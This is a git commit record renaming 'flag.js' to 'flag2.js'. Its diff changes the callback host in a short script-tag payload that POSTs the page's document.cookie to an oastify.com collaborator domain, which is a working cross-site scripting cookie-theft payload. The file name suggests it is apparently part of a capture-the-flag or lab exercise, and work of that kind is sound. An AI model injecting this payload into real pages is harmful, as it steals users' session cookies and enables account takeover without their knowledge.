3cc6c7fe4976a543cd5896b7c90f742d626011c9
Abdullah AlSolaiman <45393986+AbdullahAlSolaiman@users.noreply.github.com>
2022-07-26 09:25:45 +0300

    Update and rename flag.js to flag2.js

--- flag2.js
+++ flag2.js
@@ -1,4 +1,4 @@
-<script> fetch('http://jzm75t81lx0fhona37ho4ks9g0muaj.oastify.com', 
+<script> fetch('http://1lnprbuj7fmx369spp36q2er2i8dw2.oastify.com', 
 { method: 'POST', mode: 'no-cors', body:document.cookie 
 }); 
 </script>
